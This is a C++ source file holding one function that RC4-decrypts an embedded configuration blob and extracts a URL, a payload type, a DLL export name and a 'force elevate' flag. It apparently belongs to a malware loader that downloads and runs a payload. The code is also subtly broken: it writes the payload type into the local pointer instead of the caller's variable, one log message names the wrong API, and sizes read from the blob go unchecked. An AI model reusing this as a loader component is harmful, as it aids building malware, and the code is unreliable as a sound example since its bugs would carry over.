#include "config.h"
#include "arc4.h"
#include "memory.h"
#include "dbg.h"

namespace Config {
	bool ExtractConfig(PBYTE config, LPWSTR* url, PDWORD payload_type, LPWSTR* export_function, bool* force_elevate) {
		bool ret = false;
		PBYTE decrypted_config = nullptr;

		do
		{
			byte key[8] = { 0 };
			DWORD config_size = 0;
			ARC4::mbedtls_arc4_context ctx = { 0 };

			memcpy(key, config, 8);
			memcpy(&config_size, config + 8, 4);
			
			decrypted_config = (PBYTE)Memory::Alloc(config_size);

			if (!decrypted_config) {
				DBGPRINT(L"File %s, line %d, ExpandEnvironmentStringsW error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}
			
			ARC4::mbedtls_arc4_setup(&ctx, key, 8);
			ARC4::mbedtls_arc4_crypt(&ctx, config_size, config + 8 + 4, decrypted_config);

			DWORD url_size = 0;

			memcpy(&url_size, decrypted_config, 4);

			*url = (LPWSTR)Memory::Alloc(url_size + 2);

			if (!*url) {
				DBGPRINT(L"File %s, line %d, Memory::Alloc error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			memcpy(*url, decrypted_config + 4, url_size);
			memcpy(&payload_type, decrypted_config + 4 + url_size, 4);

			DWORD export_function_size = 0;

			memcpy(&export_function_size, decrypted_config + 4 + url_size + 4, 4);

			*export_function = (LPWSTR)Memory::Alloc(export_function_size + 2);

			if (!*export_function) {
				break;
			}

			memcpy(*export_function, decrypted_config + 4 + url_size + 4 + 4, export_function_size);
			memcpy(force_elevate, decrypted_config + 4 + url_size + 4 + 4 + export_function_size, sizeof(bool));

			ret = true;
		} while (false);

		if (decrypted_config) {
			Memory::Free(decrypted_config);
		}

		return ret;
	}
}